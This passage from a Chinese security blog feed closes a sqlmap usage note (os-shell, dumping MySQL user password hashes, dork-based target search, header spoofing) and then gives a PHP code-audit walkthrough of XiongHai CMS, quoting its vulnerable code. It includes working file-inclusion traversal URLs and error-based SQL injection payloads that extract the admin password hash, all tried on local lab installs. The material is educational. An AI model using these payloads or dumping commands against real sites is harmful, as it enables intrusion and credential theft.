injection（可联合查询注入）　　S: Stacked queries SQL injection（可多语句查询注入）　　T: Time-based blind SQL injection（基于时间延迟注入）  sqlmap -d <span class="token string">"mysql://root:root@192.168.137.1:3306/mysql"</span> --os-shell   <span class="token comment">#知道网站的账号密码直接连接</span> -v3                   <span class="token comment">#输出详细度  最大值5 会显示请求包和回复包</span>--threads <span class="token number">5</span>           <span class="token comment">#指定线程数</span>--fresh-queries       <span class="token comment">#清除缓存</span>--flush-session       <span class="token comment">#清空会话，重构注入 </span>--batch               <span class="token comment">#对所有的交互式的都是默认的</span>--random-agent        <span class="token comment">#任意的http头</span>--tamper base64encode            <span class="token comment">#对提交的数据进行base64编码</span>--referer http://www.baidu.com   <span class="token comment">#伪造referer字段</span> --keep-alive     保持连接，当出现 <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> connection dropped or unknown HTTP status code received. sqlmap is going to retry the request<span class="token punctuation">(</span>s<span class="token punctuation">)</span> 保错的时候，使用这个参数</code></pre><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>这里使用sqli-labs进行配合学习。</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"url"</span> --users</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210709083837.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -r <span class="token string">"request.txt"</span> -p <span class="token string">"username"</span> –dbms mysql</code></pre><p><code>-r</code>参数是代表传入的是文件，<code>--dbms mysql</code>代表需要来测试的是MySQL数据库。如果不指定<code>mysql</code>，则会挨个测试所有数据库类型。<code>-p</code>指定的是需要测试的注入点，如果不指定，则会测试所有的参数。这里测试<code>username</code>处的注入。<br>关于<code>--os-shell</code>命令参数，利用该模块前需要满足的条件有三个。<br>（1）网站必须是root权限</p><p>（2）攻击者需要知道网站的绝对路径</p><p>（3）GPC为off，php主动转义的功能关闭<br>这个参数怎么说呢确实厉害，但是可利用性不强，这个需要的权限太大了，所以一般无法利用，学习下姿势就可以，这里我也是没有复现成功啊，用的环境是：<code>phpStudy+sqli-labs+mysql5.7</code><br>我的主要是在权限方面出现问题了，是这样的：<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210709095433.png" loading="lazy"><br>这个是使用了命令，判断网站的权限是否为管理员权限。</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.137.1/sqli-labs/Less-1/?id=1"</span>  --is-dba --current-user</code></pre><p>google hacking<br>通过参数<code>-g &quot;inurl:.php?id=10&quot;</code>&amp;<code>-g &quot;&quot;inurl:.jsp?id=10</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210709101515.png" loading="lazy"><br>前提：可以实现科学上网。<br>可以结合其它漏扫工具来进行挖洞。待测试…..<br>然后是等级测试<br><code>--risk=1-3 --level=1-5</code><br>默认都是1，level级别越高，会加更多的测试，时间也就越长。<br>2会增加cookie的测试<br>3会增加user-agent头的测试<br>5增加检测host头注入点。</p><pre class="language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://127.0.0.1/Less-31/?id=1"</span> --risk <span class="token number">3</span> --level <span class="token number">5</span> 可以注入python sqlmap.py -u <span class="token string">"http://127.0.0.1/Less-31/"</span> 尝试一些后迅速退出 python sqlmap.py -u <span class="token string">"http://127.0.0.1/Less-31/"</span> --risk <span class="token number">3</span> --level <span class="token number">5</span> 大量payload,尝试所有可能的注入点</code></pre><p>获取数据库的密码<br>一般来说可以使用参数<code>--password</code>，如果执行失败，那么就执行下面的语句</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#php&lt;5.7</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli-labs/Less-1/?id=1"</span> -D mysql -T user -C host,user,password --dump<span class="token comment">#php>5.7</span>sqlmap -u <span class="token string">"http://192.168.137.1/sqli-labs/Less-1/?id=1"</span> -D mysql -T user -C host,user,authentication_string --dump</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20210709103039.png" loading="lazy"><br>暂时先这些，mark一下，以后继续深层内容⚒</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从熊海CMS入门PHP代码审计</title>
      <link href="/posts/a0a6d833/"/>
      <url>/posts/a0a6d833/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/39.jpg" alt="m0re" loading="lazy"><br>每个人心中的某个角落，都住着无人知道的自己 。</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近尝试入门PHP代码审计，看了很多师傅的博客和学习经历，最终选择了熊海CMS来做入门审计，而且学习渗透测试方向，必须要过代码审计这一关，先从简单的CMS来练手，熟悉一下代码审计的流程和方法。</p><h2 id="0x01-审计基础"><a href="#0x01-审计基础" class="headerlink" title="0x01 审计基础"></a>0x01 审计基础</h2><h3 id="1-1-了解常见危险函数"><a href="#1-1-了解常见危险函数" class="headerlink" title="1.1 了解常见危险函数"></a>1.1 了解常见危险函数</h3><p><code>eval</code>函数：把字符串code作为PHP代码执行。<a href="https://www.w3school.com.cn/php/func_misc_eval.asp">eval函数</a><br><code>assert</code>函数：检查一个断言是否为FALSE。（把字符串<code>$assertion</code>作为PHP代码执行）<a href="https://www.php.net/manual/zh/function.assert.php">assert函数</a><br><code>preg_replace</code>函数：执行一个正则表达式的搜索和替换。</p><pre class="language-php" data-language="php"><code class="language-php">mixed <span class="token function">preg_replace</span><span class="token punctuation">(</span>mixed <span class="token variable">$pattern</span><span class="token punctuation">,</span>mixed <span class="token variable">$replacement</span><span class="token punctuation">,</span>mixed <span class="token variable">$subject</span><span class="token punctuation">[</span><span class="token punctuation">,</span>int <span class="token variable">$limit</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">[</span><span class="token punctuation">,</span>int <span class="token operator">&amp;</span><span class="token variable">$count</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>搜索subject中匹配pattern的部分，以replacement进行替换。<br><code>call_user_func</code> ：把第一个参数作为回调函数调用。<a href="https://www.php.net/call_user_func/">https://www.php.net/call_user_func/</a><br><code>call_user_func_array</code>:把第一个参数作为回调函数(callback)调用，把参数数组(param_arr)作为回调函数的参数传入。</p><h3 id="1-2-包含函数"><a href="#1-2-包含函数" class="headerlink" title="1.2 包含函数"></a>1.2 包含函数</h3><p><code>include</code>函数：include语句包含并运行指定文件。<br><code>include_once</code>函数：<br>    <code>include_once</code>语句在脚本执行期间包含并运行指定文件。此行为和<code>include</code>语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次。<br>被包含文件</p><pre class="language-php" data-language="php"><code class="language-php">/*这个作为被包含的文件*/<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*-----m0re-----*/</span><span class="token variable">$color</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'green'</span><span class="token punctuation">;</span><span class="token variable">$fruit</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'apple'</span><span class="token punctuation">;</span></span></code></pre><p>执行文件：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"A <span class="token interpolation"><span class="token variable">$color</span></span> <span class="token interpolation"><span class="token variable">$fruit</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//A</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'m0re.php'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"A <span class="token interpolation"><span class="token variable">$color</span></span> <span class="token interpolation"><span class="token variable">$fruit</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//A green apple</span></span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-02_23-34-13.png" loading="lazy"><br>就可以看出包含函数的作用了。<br><code>Require</code>函数：<br>    require和include几乎完全一样，除了处理失败的方式不同之外。<br>    require在出错时产生<code>E_COMOILE_ERROR</code>级别的错误。换句话说将导致脚本中止。而include只产生警告(E_WARNING)，脚本会继续运行。<br><code>require_once</code>函数和<code>require</code>函数完全相同。唯一区别是PHP会检查该文件是否已经被包含，如果是则不会再次包含。</p><h3 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h3><p><code>exec()</code>执行一个外部程序<br><code>passthru()</code>执行外部程序并且显示原始输出。<br><code>proc_open()</code>执行一个命令，并且打开用来输入/输出的文件指针。<br><code>shell_exec()</code>通过shell环境执行命令，并且将完整的输出以字符串的方式返回。<br><code>system()</code>执行外部程序，并且显示输出。<br><code>popen()</code>通过<code>popen()</code>的参数传递一条命令，并对<code>popen()</code>所打开的文件进行执行。</p><h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><p><code>copy</code>拷贝文件<br><code>file_get_contents</code>将整个文件读入一个字符串。<br><code>file_put_contents</code>将一个字符串写入文件。<br><code>file</code>把整个文件读入一个数组中。<br><code>fopen</code>打开文件或者URL。<br><code>move_uploaded_file</code>将上传的文件移动到新位置。<br><code>readfile</code>输出文件。<br><code>rename</code>重命名一个文件或目录。<br><code>rmdir</code>删除目录<br><code>unlink&amp;delete</code>删除文件</p><p>其他的遇到再进行补充……<br>审计代码需要有哪些条件准备？<br>1、获取源码（没有源码，审计就无法进行）<br>2、安装网站：本地搭建好对应的测试环境。<br>了解网站目录结构</p><ul><li>网站结构：浏览源码文件夹，了解程序的大致目录</li><li>入口文件：index.php、main.php文件一般是整个程序的入口，从中可以知道：<ul><li>程序的架构</li><li>运行流程</li><li>包含哪些配置文件</li><li>包含哪些过滤文件和安全过滤文件</li><li>了解程序的业务逻辑</li></ul></li><li>配置文件：一般类似config.php等文件，保存一些数据库相关信息，程序的一些信息。<ul><li>先看数据库编码，如果是GBK可能存在宽字节注入。</li><li>若变量的值用双引号，则可能存在双引号解析代码执行的问题。</li></ul></li><li>过滤功能：通过详细读公共函数文件和安全过滤文件等文件，清晰掌握：<ul><li>用户输入的数据，哪些被过滤，哪些无过滤如何过滤。</li><li>在哪里被过滤了。</li><li>如何过滤，过滤的方式是替换还是正则，有没有GPC，有没有使用addslasher()处理？</li><li>能否绕过过滤的数据</li></ul></li></ul><p>1、通读全文法实在是太费时费力，但是最全面。</p><p>2、最高效和最常用的方法还是敏感函数参数检查，这个就可以用到Seay代码审计工具了。</p><p>3、定向功能分析法<br>按照程序的业务逻辑审计，首先是用浏览器逐个访问浏览，看看这套程序有哪些功能，根据相关功能，大概推测可能存在哪些漏洞。<br>常见功能漏洞：</p><ul><li>程序初始安装</li><li>站点信息泄露</li><li>文件上传</li><li>文件管理</li><li>登陆认证</li><li>文件删除</li><li>数据库备份恢复</li><li>找回密码</li><li>验证码</li></ul><h2 id="0x02-网站目录结构"><a href="#0x02-网站目录结构" class="headerlink" title="0x02 网站目录结构"></a>0x02 网站目录结构</h2><p>接下来开始对熊海CMS进行基础审计<br>本地源码，查看一下网站的文件目录结构，了解一下大概文件夹的功能作用。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-02_22-55-12.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">admin         --管理后台文件夹css           --存放css的文件夹files         --存放页面的文件夹images        --存放图片的文件夹inc           --存放网站配置文件的文件夹<span class="token function">install</span>       --网站进行安装的文件夹seacmseditor  --编辑器文件夹template      --模板文件夹upload        --上传功能文件夹index.php     --网站入口<span class="token punctuation">(</span>首页<span class="token punctuation">)</span></code></pre><p>先使用<code>seay源码审计工具</code>进行扫描一遍</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-02_23-58-11.png" loading="lazy"></p><p>然后使用另一个工具<code>Rips</code>进行扫描，查看结果，并与<code>seay源码审计工具</code>扫描的结果进行对比</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_09-39-48.png" loading="lazy"></p><p>两种工具最好结合使用，然后下面进行分析复现</p><h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><h3 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h3><h4 id="3-1-1-index-php文件包含漏洞"><a href="#3-1-1-index-php文件包含漏洞" class="headerlink" title="3.1.1 /index.php文件包含漏洞"></a>3.1.1 /index.php文件包含漏洞</h4><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_09-51-20.png" loading="lazy"></p><p>这个文件包含漏洞，则为，接受传参r，r不为空的话就进行包含文件操作。在我们网站根目录，我们传入一个<code>phpinfo.php</code>文件，</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/xhcms/index.php?r=../phpinfo</span><span class="token shell-comment comment">#%00截断（php&lt;5.3.4）</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/flag.php?file=../phpinfo.php%00</span><span class="token shell-comment comment">#点号截断（windows,点号位数大于256，php&lt;5.2.8）</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/xhcms/index.php?r=../phpinfo.phpspan><span class="token shell-comment comment">#路径长度溢出截断（windows，点号位数需要长于256；linux长于4096，php&lt;5.2.8）</span>http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/xhcms/index.php?r=../phpinfo.phpspan></code></pre><p>此处复现PHP版本是5.5.9<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_10-05-52.png" loading="lazy"><br><code>/admin/index.php</code>代码相同，同理可利用。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_10-30-42.png" loading="lazy"></p><h3 id="3-2-SQL注入漏洞"><a href="#3-2-SQL注入漏洞" class="headerlink" title="3.2 SQL注入漏洞"></a>3.2 SQL注入漏洞</h3><h4 id="3-2-1-后台注入"><a href="#3-2-1-后台注入" class="headerlink" title="3.2.1 后台注入"></a>3.2.1 后台注入</h4><p><strong>/admin/files/login.php</strong><br>为什么先看这里，因为在登录框处必然调用数据库，最有可能存在SQL注入和万能密码<br>关键代码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">require</span> <span class="token single-quoted-string string">'../inc/conn.php'</span><span class="token punctuation">;</span><span class="token variable">$login</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$checkbox</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'checkbox'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$login</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM manage WHERE user='<span class="token interpolation"><span class="token variable">$user</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SQL语句有误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$users</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$passwords</span><span class="token operator">=</span><span class="token variable">$users</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token variable">$passwords</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;Script language=JavaScript>alert('抱歉，用户名或者密码错误。');history.back();&lt;/Script>"</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>执行的SQL语句为：<code>SELECT * FROM manage WHERE user=&#39;$user&#39;</code><br>没有看到有关登录验证的过滤函数，所以这就可以直接进行SQL注入。而且由<code>$result = mysql_query($query) or die(&#39;SQL语句有误：&#39;.mysql_error());</code>这里可以看出mysql_error()是开启的，可以进行报错注入。<br>但是这个地方不能使用万能密码来进行登录，为什么呢？因为这里将我们传入的password变量进行MD5散列，然后使用散列值与数据库中的密码进行对比，这里就不能使用万能密码进行登录绕过。<br>然后就是验证漏洞存在</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token single-quoted-string string">' or updatexml(1,concat((select concat(0x7e,password) from manage)),0) #1'</span> <span class="token keyword">or</span> <span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select <span class="token function">concat</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span> from manage<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token shell-comment comment">#</span></code></pre><p>也可以使用sqlmap跑，手注确实费力，但是注入流程要熟悉。<br>上面的payload为注入password的散列值，不过updatexml一次返回27位，不能完整返回password的散列值，只能采用两条语句来查询。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_12-02-11.png" loading="lazy"><br>两次拼接得到完整的散列值，进行MD5爆破即可得出<code>password</code>明文<br>重点不在注入，所以注入过程省略，以下皆寻找注入类型和代码<br>**/admin/files/softlist.php**</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$delete</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$delete</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"DELETE FROM download WHERE id='<span class="token interpolation"><span class="token variable">$delete</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SQL语句有误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>alert('亲，ID为"</span><span class="token punctuation">.</span><span class="token variable">$delete</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"的内容已经成功删除！');location.href='?r=softlist'&lt;/script>"</span><span class="token punctuation">;</span></code></pre><p>发现一个问题就是在此套cms中，涉及MySQL的语句，不论是查询还是delete或者其它操作，均未使用waf或者过滤，这可能也就是它适合初学者进行入门审计的原因之一了。<br>**/admin/files/wzlist.php**</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$delete</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$delete</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"DELETE FROM content WHERE id='<span class="token interpolation"><span class="token variable">$delete</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'SQL语句有误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>又是一枚报错注入。无过滤！！！<br>还存在SQL注入的位置<code>/admin/files/reply.php</code>、<code>/admin/files/newlink</code>等等，基本都是后台的注入，吐槽一下这个写的确实有点拉跨。</p><h4 id="3-2-2-前台注入"><a href="#3-2-2-前台注入" class="headerlink" title="3.2.2 前台注入"></a>3.2.2 前台注入</h4><p><strong>/files/software.php</strong><br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_12-21-11.png" loading="lazy"><br><code>addslashes()</code>函数返回在预定义字符之前添加反斜杠的字符串。<br>参考：<a href="https://www.w3school.com.cn/php/func_string_addslashes.asp">https://www.w3school.com.cn/php/func_string_addslashes.asp</a><br>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（）</li><li>NULL</li></ul><blockquote><p>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//浏览计数</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"UPDATE download SET hit = hit+1 WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>@<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'修改错误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这里<code>id=$id</code>没有使用单引号或者双引号包起<code>$id</code>。所以这里addslashes()函数就不起作用，仍然造成SQL注入。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//payload</span><span class="token operator">?</span>r<span class="token operator">=</span>content<span class="token operator">&amp;</span>cid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token function">20or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>select<span class="token operator">%</span><span class="token function">20version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//return</span><span class="token comment">//修改错误：XPATH syntax error: '~5.7.26~'</span></code></pre><p>其他地方的就与上面的类型相同了，不再赘述。<br>**/install/index.php**<br>安装流程存在SQL注入，不知道怎么利用，阅读大佬的经验文章，发现install的位置，也就是在安装cms的位置，也存在SQL注入的。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"UPDATE manage SET user='<span class="token interpolation"><span class="token variable">$user</span></span>',password='<span class="token interpolation"><span class="token variable">$password</span></span>',name='<span class="token interpolation"><span class="token variable">$user</span></span>'"</span><span class="token punctuation">;</span>@<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'修改错误：'</span><span class="token punctuation">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"管理信息已经成功写入!&lt;br />&lt;br />"</span><span class="token punctuation">;</span></code></pre><p>同样不存在过滤，这里进行验证一下<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_13-00-40.png" loading="lazy"><br>先删除<code>InstallLock.txt</code>文件锁，再重新安装<br>在user的位置进行注入，依旧是报错注入<br>这里不再啰嗦，粘一下最后的验证结果</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_13-05-55.png" loading="lazy"></p><h3 id="3-3-XSS漏洞"><a href="#3-3-XSS漏洞" class="headerlink" title="3.3 XSS漏洞"></a>3.3 XSS漏洞</h3><h4 id="3-3-1-反射型XSS"><a href="#3-3-1-反射型XSS" class="headerlink" title="3.3.1 反射型XSS"></a>3.3.1 反射型XSS</h4><p><strong>/files/contact.php</strong><br>扫描器扫出<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_13-39-20.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">$page=addslashes($_GET['page']); //59行<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$page</span><span class="token delimiter important">?></span></span> //139行</code></pre><p>进行利用复现，最简单的payload，没有任何过滤。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_13-31-36.png" loading="lazy"><br>还有其它的。<br><img src="https://gitee.com/m0re/picture/raw/master/img/Snipaste_2021-05-03_15-44-21.png" loading="lazy"><br>这个不是扫描器的话，不好发现，因为在我之前的学习中，xss最常出现的地方是评论区，留言板之类的。</p><h4 id="3-3-2-存储型XSS"><a href="#3-3-2-存储型XSS" class="headerlink" title="3.3.2 存储型XSS"></a>3.3.2 存储型XSS</h4><p>这个地方我找到评论功能的所在处</p><pre class="language-php" data-language="php"><code class="language-php">#    /admin/files/commentlist.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span> <span class="token single-quoted-string string">'../inc/checklogin.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token single-quoted-string string">'../inc/conn.php'</span><span class="token punctuation">;</span><span class="token variable">$hdopen</span><span class="token operator">=</span><span class="token single-quoted-string string">'class="open"'</span><span class="token punctuation">;</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token single-quoted-string string">'comment'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fhlink</span><span class="token operator">=</span><span class="token double-quoted-string string">"?r=commentlist&amp;type=comment"</span><span class="token punctuation">;</span><span class="token variable">$fhname</span><span class="token operator">=</span><span class="token double-quoted-string string">"评论"</span><span class="token punctuation">;</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$taojian</span><span class="token operator">=</span><span class="token double-quoted-string string">"type=1 AND cid&lt;>0"</span><span class="token punctuation">;</span><span class="token variable">$biao</span><span class="token operator">=</span><span class="token double-quoted-string string">"content"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token single-quoted-string string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fhlink</span><span class="token operator">=</span><span class="token double-quoted-string string">"?r=commentlist&amp;type=message"</span><span class="token punctuation">;</span><span class="token variable">$fhname</span><span class="token operator">=</span><span class="token double-quoted-string string">"留言"</span><span class="token punctuation">;</span><span class="token variable">$type</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token variable">$taojian</span><span class="token operator">=</span><span class="token double-quoted-string string">"type=2 AND cid=0"</span><span class="token 